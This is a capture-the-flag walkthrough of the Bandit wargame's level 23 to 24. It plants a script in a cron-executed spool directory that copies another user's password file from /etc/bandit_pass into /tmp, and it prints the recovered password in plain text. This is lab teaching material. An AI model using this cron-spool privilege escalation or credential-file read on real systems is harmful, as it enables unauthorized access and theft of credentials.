# Solution

(completing this was freaking amazing)

```
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
*We know that it will execute every file which belongs to the bandit23 (our current state)* 

We simply have to create a script in the directory /var/spool/bandit24
which will save the password from the /etc/bandit_pass/bandit24 to a file in /tmp/ (I Created *jaldi* in this case)

Script trying.sh:
```
cat /etc/bandit_pass/bandit24 > /tmp/jaldi
```

Commands I used later:

```
nano /var/spool/bandit24/trying.sh
Unable to create directory /home/bandit23/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

bandit23@bandit:~$ chmod +x /var/spool/bandit24/trying.sh
bandit23@bandit:~$ cat /tmp/jaldi
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

password: `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`